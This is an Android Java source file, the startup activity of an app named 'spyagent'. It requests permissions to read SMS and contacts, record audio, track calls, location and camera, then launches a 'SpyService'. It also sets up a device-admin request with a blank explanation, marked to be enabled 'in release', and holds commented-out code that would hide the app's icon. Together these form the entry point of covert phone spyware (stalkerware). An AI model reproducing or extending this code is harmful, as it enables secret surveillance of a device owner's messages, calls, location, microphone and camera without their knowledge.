package com.irodyk.spyagent.view;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import com.irodyk.spyagent.SpyService;
import com.irodyk.spyagent.receiver.AdminReceiver;

import java.util.ArrayList;

/**
 * Created by i.rodyk on 8/29/16.
 */
public class StartupActivity extends Activity {

    private static final int REQUEST_DEVICE_ADMIN = 782;
    private static final int REQUEST_PERMISSION = 605;

    private final String[] PERMISSIONS = {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.PROCESS_OUTGOING_CALLS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA};

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        final ComponentName deviceAdmin = new ComponentName(this, AdminReceiver.class);
        final DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (!dpm.isAdminActive(deviceAdmin)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdmin);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "");
            Log.d(getClass().getSimpleName(), "Application admin ");
            //startActivityForResult(intent, REQUEST_DEVICE_ADMIN); //todo uncomment in release
        }

        if (Build.VERSION.SDK_INT >= 23){
            ArrayList<String> toRequest = new ArrayList<>();
            for(int i = 0; i < PERMISSIONS.length; i++){
                if(checkSelfPermission(PERMISSIONS[i]) != PackageManager.PERMISSION_GRANTED){
                    toRequest.add(PERMISSIONS[i]);
                }
            }
            if(toRequest.size() > 0){
                requestPermissions(toRequest.toArray(new String[toRequest.size()]), REQUEST_PERMISSION);
            }
        }



        startService(new Intent(this, SpyService.class));

//        PackageManager p = getPackageManager();
//        p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

    }
}
